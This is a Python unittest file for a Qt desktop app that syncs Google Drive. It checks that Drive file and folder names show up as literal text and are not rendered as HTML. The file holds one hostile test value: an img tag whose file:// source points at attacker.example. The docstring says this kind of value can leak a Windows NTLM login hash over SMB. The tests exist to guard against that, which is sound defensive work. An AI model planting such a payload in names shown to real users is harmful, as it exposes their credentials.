"""Security: names from Google Drive (anyone can share a folder with you, and Drive allows < > " / in
names) must never be read as HTML by Qt. A name like <img src="file://host/share/x.png"> shown as rich
text makes Windows connect to that host over SMB and send the user's login hash (NTLM).
Run:  python -m unittest test_qtui_text_safety -v
"""
import os
import tempfile
import unittest
from unittest import mock

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

try:
    from PySide6.QtCore import Qt
    from PySide6.QtWidgets import QApplication, QLabel, QMessageBox
except ImportError:  # pragma: no cover
    QApplication = None

if QApplication is not None:
    from qtui import widgets
    from qtui.drive_browser import DriveBrowser
    from qtui.header import Header
    from test_qtui import dispose, fake_app
    from test_qtui_dialogs import FakeDrive, app_with

EVIL = '<img src="file://attacker.example/s/a.png">'


@unittest.skipIf(QApplication is None, "PySide6 not installed")
class TextSafetyTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.qapp = QApplication.instance() or QApplication([])

    def test_labels_are_plain_text(self):
        lb = widgets.label(EVIL)
        self.addCleanup(dispose, lb)
        self.assertEqual(lb.textFormat(), Qt.TextFormat.PlainText)
        self.assertEqual(lb.text(), EVIL)

    def test_safe_escapes_only_what_would_be_read_as_html(self):
        self.assertEqual(widgets.safe("Stop syncing this folder?\n\nD:\\EBC"), "Stop syncing this folder?\n\nD:\\EBC")
        out = widgets.safe("Couldn't sync " + EVIL + "\nnext line")
        self.assertNotIn("<img", out)
        self.assertIn("&lt;img", out)
        doc_text = self._as_shown(out)
        self.assertIn(EVIL, doc_text)                       # shown literally, line breaks kept
        self.assertIn("next line", doc_text)

    def _as_shown(self, text: str) -> str:
        from PySide6.QtGui import QTextDocument
        d = QTextDocument()
        from PySide6 import QtGui
        d.setHtml(text) if QtGui.Qt.mightBeRichText(text) else d.setPlainText(text)
        return d.toPlainText()

    def test_safe_html_never_loads_images(self):
        with tempfile.TemporaryDirectory() as tmp:
            img = os.path.join(tmp, "x.png")
            from PySide6.QtGui import QImage
            QImage(300, 200, QImage.Format.Format_RGB32).save(img)
            name = f'<img src="file:///{img.replace(os.sep, "/")}">'
            lb = QLabel(widgets.safe(name))                  # a QLabel left on AutoText, with safe() text
            self.addCleanup(dispose, lb)
            self.assertLess(lb.sizeHint().height(), 100)    # the 200 px image was not loaded

    def test_drive_browser_path_shows_the_name_literally(self):
        drive = FakeDrive()
        drive.folders["root"].append({"id": "evil", "name": EVIL})
        drive.folders["evil"] = []
        b = DriveBrowser(None, app_with(drive), "teacher@example.com", run_now=True)
        self.addCleanup(dispose, b)
        b.open(("evil", EVIL, True))
        self.assertEqual(b.path_lbl.textFormat(), Qt.TextFormat.PlainText)
        self.assertEqual(b.path_lbl.text(), "My Drive/" + EVIL)

    def test_header_shows_file_names_literally(self):
        app = fake_app(state="syncing", detail="Uploading", file_lines=[EVIL])
        h = Header(app)
        self.addCleanup(dispose, h)
        h.refresh()
        for lb in (h.status_lbl, h.detail_lbl):
            self.assertEqual(lb.textFormat(), Qt.TextFormat.PlainText)

    def test_tooltips_and_message_boxes_are_escaped(self):
        from qtui.folders_tab import FoldersTab
        app = fake_app(cfg={"appearance": "Light", "folders": [{"local": "D:\\X", "account": "a@x.com",
                                                                  "exclude": ["Photos/" + EVIL]}]})
        app.accounts_info.return_value = [{"email": "a@x.com", "needs_signin": False, "folders": 1}]
        app.folder_account.side_effect = lambda f, known: f.get("account")
        app.is_waiting.return_value = False
        app.remote_ids = {}
        t = FoldersTab(app)
        t.refresh()
        self.addCleanup(dispose, t)
        tips = [w.toolTip() for w in t.findChildren(QLabel) if w.toolTip()]
        self.assertTrue(tips)
        self.assertTrue(all("<img" not in tip for tip in tips))
        from qtui.main_window import MainWindow
        w = MainWindow(fake_app())
        self.addCleanup(dispose, w)
        w.app.ui.put(("error", "Couldn't sync " + EVIL))
        with mock.patch.object(QMessageBox, "critical") as crit:
            w.poll()
        self.assertNotIn("<img", crit.call_args.args[2])


if __name__ == "__main__":
    unittest.main()
